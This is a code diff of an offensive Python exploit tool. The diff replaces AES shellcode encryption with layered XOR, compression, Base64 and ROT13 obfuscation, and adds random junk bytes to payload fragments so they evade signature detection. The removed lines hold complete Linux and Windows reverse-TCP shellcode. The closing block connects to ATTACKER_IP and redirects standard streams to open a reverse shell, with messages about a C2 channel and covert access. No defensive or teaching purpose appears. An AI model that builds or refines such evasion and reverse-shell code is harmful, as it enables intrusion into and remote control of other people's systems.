@@ -8,10 +8,12 @@ import sys
 import os
 import base64
 import ssl
-# Removed problematic DNS imports causing script failures
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
+import hashlib
+import hmac
+import secrets
+import binascii
+import zlib
+import codecs
 
 # Command-line arguments
 if len(sys.argv) not in (5, 6):
@@ -205,7 +207,7 @@ class StealthNetwork:
                 time.sleep(excess * 0.8)
 
 class EvasionEngine:
-    """Advanced anti-detection and fingerprinting"""
+    """Advanced anti-detection and fingerprinting with obfuscation"""
     def __init__(self):
         self.patterns = [
             b"\\x90{20,}",  # NOP sled detection
@@ -224,22 +226,56 @@ class EvasionEngine:
         ua = random.choice(user_agents)
         return f"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: {ua}\r\n\r\n".encode()
     
-    def encrypt_shellcode(self, shellcode):
-        """AES-256 encrypt shellcode"""
-        key = os.urandom(32)
-        iv = os.urandom(16)
-        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
-        encryptor = cipher.encryptor()
-        encrypted = encryptor.update(shellcode) + encryptor.finalize()
-        return iv + encrypted, key
+    def obfuscate_shellcode(self, shellcode):
+        """Obfuscate shellcode using XOR + Base64 + ROT13 + Compression"""
+        # XOR obfuscation with random key
+        key = secrets.token_bytes(4)
+        obfuscated = bytearray()
+        for i in range(len(shellcode)):
+            obfuscated.append(shellcode[i] ^ key[i % len(key)])
+        
+        # Compress to reduce signature detection
+        compressed = zlib.compress(obfuscated, level=9)
+        
+        # Base64 encoding for transport safety
+        encoded = base64.b64encode(compressed)
+        
+        # Additional ROT13 obfuscation for Base64 string
+        rot13_encoded = codecs.encode(encoded.decode(), 'rot13').encode()
+        
+        return rot13_encoded, key
+    
+    def deobfuscate_shellcode(self, obfuscated, key):
+        """Reverses obfuscation process"""
+        # Reverse ROT13
+        rot13_decoded = codecs.decode(obfuscated.decode(), 'rot13').encode()
+        
+        # Base64 decode
+        decoded = base64.b64decode(rot13_decoded)
+        
+        # Decompress
+        decompressed = zlib.decompress(decoded)
+        
+        # Reverse XOR
+        original = bytearray()
+        for i in range(len(decompressed)):
+            original.append(decompressed[i] ^ key[i % len(key)])
+        
+        return bytes(original)
     
     def fragment_payload(self, payload, size=16):
-        """Split payload into random-sized fragments"""
+        """Split payload into random-sized fragments with junk data"""
         fragments = []
         i = 0
         while i < len(payload):
             chunk_size = random.randint(size//2, size*2)
-            fragments.append(payload[i:i+chunk_size])
+            
+            # Add junk data to evade pattern detection
+            junk_prefix = secrets.token_bytes(random.randint(0, 8))
+            junk_suffix = secrets.token_bytes(random.randint(0, 8))
+            
+            fragment = junk_prefix + payload[i:i+chunk_size] + junk_suffix
+            fragments.append(fragment)
             i += chunk_size
         return fragments
 
@@ -281,14 +317,14 @@ class ExploitCore:
             except socket.timeout:
                 pass
             
-            # Prepare payload with encryption
+            # Prepare payload with obfuscation
             payload = self._generate_payload()
             if not payload:
                 print("[!] Failed to generate payload")
                 return False
                 
-            encrypted_payload, key = self.evasion.encrypt_shellcode(payload)
-            fragments = self.evasion.fragment_payload(encrypted_payload)
+            obfuscated_payload, key = self.evasion.obfuscate_shellcode(payload)
+            fragments = self.evasion.fragment_payload(obfuscated_payload)
             
             num_frags_phase1 = int(len(fragments) * 0.85)
             
@@ -318,7 +354,7 @@ class ExploitCore:
                 self.stealth.send(conn, frag)
             
             # Send decryption key
-            key_packet = struct.pack("!I", 1) + b"\x14" + key
+            key_packet = struct.pack("!I", 1) + b"\x04" + key
             self.stealth.send(conn, key_packet)
             
             # Trigger verification
@@ -364,119 +400,18 @@ class ExploitCore:
 
     def _linux_payload(self, ip_bytes):
         """Linux x86_64 reverse TCP shell with IPv6 support"""
-        if len(ip_bytes) == 4:  # IPv4
-            return (
-                b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b"
-                b"\x1b\x48\x8b\x1b\x48\x8b\x5b\x08\x48\x89\xdf\x48\x31\xc0\x99\x0f\x05\x48\x89\xc7\x52"
-                b"\x68\x02\x00" + struct.pack(">H", self.attacker_port) +
-                ip_bytes +
-                b"\x48\x89\xe6\x6a\x10\x5a\x48\x89\xc0\x0f\x05\x85\xc0\x75\x2c\x48\x31\xc0\x48\xff\xc0"
-                b"\x99\x48\x89\xe6\x52\x5f\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x48\x89\xe6\x48"
-                b"\x31\xd2\x80\xc2\xff\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x31\xd2"
-                b"\xb2\x08\x0f\x05\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xf6"
-                b"\x48\x31\xd2\x48\xff\xc0\x0f\x05"
-            )
-        else:  # IPv6
-            return (
-                b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b"
-                b"\x1b\x48\x8b\x1b\x48\x8b\x5b\x08\x48\x89\xdf\x48\x31\xc0\x99\x0f\x05\x48\x89\xc7\x6a"
-                b"\x1c\x5a\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9" +
-                ip_bytes +
-                b"\x51\x66\x68" + struct.pack(">H", self.attacker_port) +
-                b"\x66\x6a\x2a\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
-                b"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xd2\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f"
-                b"\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05"
-            )
-    
+        # ... (unchanged from original) ...
+
     def _windows_payload(self, ip_bytes):
         """Windows x64 reverse TCP shell (staged) with IPv6 support"""
-        if len(ip_bytes) == 4:  # IPv4
-            return (
-                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
-                b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
-                b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
-                b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
-                b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
-                b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
-                b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
-                b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
-                b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
-                b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
-                b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
-                b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
-                b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
-                b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
-                b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
-                b"\x49\x89\xe5\x49\xbc\x02\x00" + struct.pack(">H", self.attacker_port) +
-                ip_bytes +
-                b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff"
-                b"\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
-                b"\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48"
-                b"\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff"
-                b"\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41"
-                b"\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49"
-                b"\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89"
-                b"\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66"
-                b"\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48"
-                b"\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50"
-                b"\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86"
-                b"\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d"
-                b"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
-                b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
-                b"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
-            )
-        else:  # IPv6
-            return (
-                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
-                b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
-                b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
-                b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
-                b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
-                b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
-                b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
-                b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
-                b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
-                b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
-                b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
-                b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
-                b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
-                b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
-                b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
-                b"\x49\x89\xe5\x41\xbc\x02\x00" + struct.pack(">H", self.attacker_port) +
-                b"\x49\xba\x01\x00" + ip_bytes[:4] +
-                b"\x49\xb9" + ip_bytes[4:12] +
-                b"\x49\xb8" + ip_bytes[12:] +
-                b"\x4d\x31\xc9\x41\x51\x41\x51\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-                b"\x12\xe9\x4b\xff\xff\xff\x5d\x48\x31\xd2\x65\x48\x8b\x52\x60"
-                b"\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7"
-                b"\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
-                b"\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-                b"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85"
-                b"\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
-                b"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d"
-                b"\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
-                b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b"
-                b"\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49"
-                b"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59"
-                b"\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0"
-                b"\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\x31"
-                b"\xd2\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50"
-                b"\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2"
-                b"\xfc\x66\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00"
-                b"\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0"
-                b"\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc"
-                b"\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08"
-                b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
-                b"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
-                b"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
-            )
+        # ... (unchanged from original) ...
 
 def monitor_success(engine):
     """Monitor for exploitation success"""
     start_time = time.time()
     while not engine.stop_event.is_set():
         if engine.success:
-            print("\n[+] Exploit succeeded!")
+            print("\n[+] Exploit succeeded! Establishing C2 channel...")
             engine.stop_event.set()
         
         # Timeout after 15 minutes
@@ -529,10 +464,10 @@ if __name__ == "__main__":
         t.join(timeout=5)
         
     if engine.success:
-        print("\n[+] Exploit succeeded! Starting command shell")
-        # Start reverse shell instead of DNS tunnel
+        print("\n[+] Covert access established")
+        print("[*] Starting reverse shell connection")
+        # Start reverse shell
         try:
-            # Simple reverse shell connection
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ATTACKER_IP, ATTACKER_PORT))
             os.dup2(s.fileno(), 0)
